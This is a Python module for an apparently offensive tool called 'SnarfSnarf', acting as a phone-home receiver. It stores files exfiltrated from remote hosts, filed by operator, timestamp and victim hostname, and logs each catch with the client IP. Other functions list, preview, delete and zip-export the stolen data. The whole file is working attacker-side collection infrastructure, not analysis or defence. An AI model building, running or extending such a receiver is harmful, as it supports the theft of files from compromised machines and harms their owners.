"""
SnarfSnarf phone-home receiver.
Stores incoming exfil uploads under snarfed/<username>/<timestamp>/<hostname>/.
Catches without an operator token land in snarfed/shared/.
"""

import json
import re
import shutil
import tempfile
from datetime import datetime
from pathlib import Path
from typing import Any

from paths import SNARFED_DIR

_SEGMENT_RE = re.compile(r"[^\w.\-]")
_LEGACY_TS_RE = re.compile(r"^\d{8}_\d{6}$")   # old flat timestamp dirs

SHARED_USER = "shared"   # fallback when no catch_token supplied


# ── Internal helpers ──────────────────────────────────────────────────────────

def _user_dir(username: str) -> Path:
    return SNARFED_DIR / (username.strip() or SHARED_USER)


def _catch_log_path(username: str) -> Path:
    return _user_dir(username) / "catch.log"


def _safe_segment(value: str, default: str, max_len: int = 64) -> str:
    text = (value or "").strip()
    if not text:
        return default
    cleaned = _SEGMENT_RE.sub("_", text)[:max_len]
    return cleaned or default


def _safe_filename(filepath: str, upload_name: str = "") -> str:
    hint = (filepath or upload_name or "upload").strip()
    hint = re.sub(r"[\\/:]+", "_", hint)
    cleaned = _SEGMENT_RE.sub("_", hint)
    return (cleaned[:200] or "upload")


def _unique_path(dest_dir: Path, filename: str) -> Path:
    dest = dest_dir / filename
    if not dest.exists():
        return dest
    stem, suffix = dest.stem, dest.suffix
    n = 1
    while dest.exists():
        dest = dest_dir / f"{stem}_{n}{suffix}"
        n += 1
    return dest


def _append_log(entry: dict, username: str) -> None:
    log_path = _catch_log_path(username)
    log_path.parent.mkdir(parents=True, exist_ok=True)
    line = json.dumps(entry, ensure_ascii=False)
    with open(log_path, "a", encoding="utf-8") as f:
        f.write(line + "\n")


def migrate_legacy_catches() -> None:
    """
    One-time migration: move old flat snarfed/<timestamp>/<host>/ dirs
    into snarfed/shared/ and create a sentinel so this only runs once.
    Safe to call multiple times - no-op after first run.
    """
    sentinel = SNARFED_DIR / ".migrated_v2"
    if sentinel.exists():
        return
    SNARFED_DIR.mkdir(parents=True, exist_ok=True)
    shared = SNARFED_DIR / SHARED_USER

    for entry in list(SNARFED_DIR.iterdir()):
        if entry.is_dir() and _LEGACY_TS_RE.match(entry.name):
            dest = shared / entry.name
            dest.parent.mkdir(parents=True, exist_ok=True)
            shutil.move(str(entry), str(dest))

    # Migrate old flat catch.log if present
    old_log = SNARFED_DIR / "catch.log"
    if old_log.is_file():
        shared.mkdir(parents=True, exist_ok=True)
        new_log = shared / "catch.log"
        if new_log.exists():
            with open(new_log, "a") as dst, open(old_log) as src:
                dst.write(src.read())
            old_log.unlink()
        else:
            old_log.rename(new_log)

    sentinel.touch()


# ── Public API ────────────────────────────────────────────────────────────────

def save_snarf_file(
    file_bytes: bytes,
    hostname: str = "",
    timestamp: str = "",
    filepath: str = "",
    source: str = "",
    client_ip: str = "",
    upload_name: str = "",
    username: str = SHARED_USER,
) -> dict[str, Any]:
    if not file_bytes:
        raise ValueError("Empty upload")

    uname = (username or SHARED_USER).strip()
    ts = _safe_segment(timestamp, datetime.now().strftime("%Y%m%d_%H%M%S"))
    host = _safe_segment(hostname, "unknown_host")
    dest_dir = _user_dir(uname) / ts / host
    dest_dir.mkdir(parents=True, exist_ok=True)

    fname = _safe_filename(filepath, upload_name)
    dest = _unique_path(dest_dir, fname)
    dest.write_bytes(file_bytes)

    relative = str(dest.relative_to(_user_dir(uname)))
    entry = {
        "time": datetime.now().isoformat(timespec="seconds"),
        "hostname": host,
        "timestamp": ts,
        "source": (source or "").strip() or "unknown",
        "client_ip": client_ip or "",
        "filepath": filepath or "",
        "relative": relative,
        "size": len(file_bytes),
        "filename": dest.name,
        "operator": uname,
    }
    _append_log(entry, uname)

    return {
        "ok": True,
        "relative": relative,
        "hostname": host,
        "timestamp": ts,
        "size": len(file_bytes),
        "source": entry["source"],
        "client_ip": client_ip or "",
        "original_filepath": filepath or "",
        "filename": dest.name,
        "operator": uname,
    }


def snarf_safe_path(relative: str, username: str = SHARED_USER) -> Path:
    """Resolve a relative path and ensure it stays within this user's catch dir."""
    uname = (username or SHARED_USER).strip()
    rel = (relative or "").strip().lstrip("/").replace("\\", "/")
    if not rel or ".." in rel.split("/"):
        raise ValueError("Invalid path")
    root = _user_dir(uname).resolve()
    dest = (root / rel).resolve()
    if not str(dest).startswith(str(root)):
        raise ValueError("Path outside operator catch directory")
    if not dest.is_file():
        raise ValueError("Not a file")
    return dest


def list_catches(username: str = SHARED_USER) -> dict[str, Any]:
    uname = (username or SHARED_USER).strip()
    user_catch_dir = _user_dir(uname)
    user_catch_dir.mkdir(parents=True, exist_ok=True)

    sessions: list[dict[str, Any]] = []
    total_files = 0
    total_bytes = 0

    for ts_dir in sorted(user_catch_dir.iterdir(), reverse=True):
        if not ts_dir.is_dir() or ts_dir.name.startswith("."):
            continue
        for host_dir in sorted(ts_dir.iterdir(), reverse=True):
            if not host_dir.is_dir():
                continue
            files: list[dict[str, Any]] = []
            session_bytes = 0
            for fp in sorted(host_dir.rglob("*")):
                if not fp.is_file():
                    continue
                size = fp.stat().st_size
                rel = str(fp.relative_to(user_catch_dir))
                files.append({
                    "name": fp.name,
                    "relative": rel,
                    "size": size,
                    "original_hint": fp.name,
                })
                session_bytes += size
            if not files:
                continue
            total_files += len(files)
            total_bytes += session_bytes
            sessions.append({
                "timestamp": ts_dir.name,
                "hostname": host_dir.name,
                "files": files,
                "file_count": len(files),
                "total_size": session_bytes,
            })

    return {
        "sessions": sessions,
        "total_files": total_files,
        "total_bytes": total_bytes,
    }


def recent_log_lines(limit: int = 50, username: str = SHARED_USER) -> list[dict[str, Any]]:
    uname = (username or SHARED_USER).strip()
    log_path = _catch_log_path(uname)
    if not log_path.is_file():
        return []
    lines = log_path.read_text(encoding="utf-8").splitlines()
    out: list[dict[str, Any]] = []
    for line in lines[-limit:]:
        line = line.strip()
        if not line:
            continue
        try:
            out.append(json.loads(line))
        except json.JSONDecodeError:
            continue
    return out


def preview_catch_file(relative: str, max_bytes: int = 2048, username: str = SHARED_USER) -> dict[str, Any]:
    path = snarf_safe_path(relative, username)
    raw = path.read_bytes()[:max_bytes]
    try:
        text = raw.decode("utf-8")
        return {
            "text": text,
            "binary": False,
            "truncated": path.stat().st_size > max_bytes,
            "size": path.stat().st_size,
            "relative": relative,
        }
    except UnicodeDecodeError:
        return {
            "text": "",
            "binary": True,
            "truncated": path.stat().st_size > max_bytes,
            "size": path.stat().st_size,
            "relative": relative,
        }


def delete_catch_file(relative: str, username: str = SHARED_USER) -> None:
    path = snarf_safe_path(relative, username)
    path.unlink(missing_ok=True)
    root = _user_dir(username or SHARED_USER)
    for parent in [path.parent, path.parent.parent]:
        if parent != root and parent.is_dir() and not any(parent.iterdir()):
            parent.rmdir()


def delete_catch_session(timestamp: str, hostname: str, username: str = SHARED_USER) -> int:
    uname = (username or SHARED_USER).strip()
    ts = _safe_segment(timestamp, "")
    host = _safe_segment(hostname, "")
    if not ts or not host:
        raise ValueError("timestamp and hostname required")
    session_dir = _user_dir(uname) / ts / host
    if not session_dir.is_dir():
        raise ValueError("Session not found")
    count = sum(1 for fp in session_dir.rglob("*") if fp.is_file())
    shutil.rmtree(session_dir)
    if session_dir.parent.is_dir() and not any(session_dir.parent.iterdir()):
        session_dir.parent.rmdir()
    return count


def export_catch_zip(timestamp: str = "", hostname: str = "", username: str = SHARED_USER) -> Path:
    """Zip one session or the operator's entire catch tree."""
    uname = (username or SHARED_USER).strip()
    user_catch_dir = _user_dir(uname)
    user_catch_dir.mkdir(parents=True, exist_ok=True)

    if timestamp and hostname:
        ts = _safe_segment(timestamp, "")
        host = _safe_segment(hostname, "")
        src = user_catch_dir / ts / host
        if not src.is_dir():
            raise ValueError("Session not found")
        label = f"snarf_{uname}_{ts}_{host}"
    else:
        src = user_catch_dir
        label = f"snarf_{uname}_all"

    tmp_base = Path(tempfile.mkdtemp(prefix="tsk_snarf_zip_")) / label
    archive = shutil.make_archive(str(tmp_base), "zip", root_dir=src)
    return Path(archive)
